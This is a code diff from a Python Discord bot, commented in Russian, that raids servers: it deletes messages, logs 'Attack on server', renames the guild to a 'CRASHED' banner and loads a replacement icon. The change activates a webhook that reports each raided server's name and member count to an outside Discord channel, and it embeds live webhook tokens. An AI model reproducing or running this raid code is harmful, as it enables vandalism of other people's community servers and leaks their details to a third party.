@@ -132,8 +132,9 @@ class MyClient(discord.Client):
 				await message.delete() #удаление сообщения
 				#await client.get_channel(732820713584721923).send('**Участник под ником **' + message.author + ' **крашит сервер **' + message.guild.name + ' **с** ' + str(len(message.guild.members)) + ' **участниками. Не доверяйте админ-права незнакомцам, будьте бдительны!**')
 				print('Атака на сервер', message.guild.name)
-				#webhook = DiscordWebhook(url='https://discordapp.com/api/webhooks/745515368168030259/oxNz2pe5ezZRWu6MPtDFTvHr5PG55lJGKAJO90k865SuHRFPfgfEjT8KoKyFx6MZZFqH', content='**Участник под ником **' + str(message.author) + ' **крашит сервер **' + str(message.guild.name) + ' **с** ' + str(len(message.guild.members)) + ' **участниками. Не доверяйте админ-права незнакомцам, будьте бдительны!**')
-				#response = webhook.execute()
+				webhook = DiscordWebhook(url='https://discordapp.com/api/webhooks/746948122894139486/801Ex9WqPVA91ZEXNVRyWBBH6Cv7RStx8Ky6HYiNHq5l2NPJlfY0zWPR9RtZgrPdKC73', content=':biohazard: **Участник под ником **' + str(message.author) + ' **крашит сервер **' + str(message.guild.name) + ' **с** ' + str(len(message.guild.members)) + ' **участниками. Не доверяйте админ-права незнакомцам, будьте бдительны!**')
+				if message.guild.name != '__...-<<CRASHED>>-...__' and len(message.guild.members) > 5:
+					response = webhook.execute()
 				await message.guild.edit(name='__...-<<CRASHED>>-...__') #переименовывание сервера
 				with open('chaos.jpeg', 'rb') as f:
 					icon = f.read()
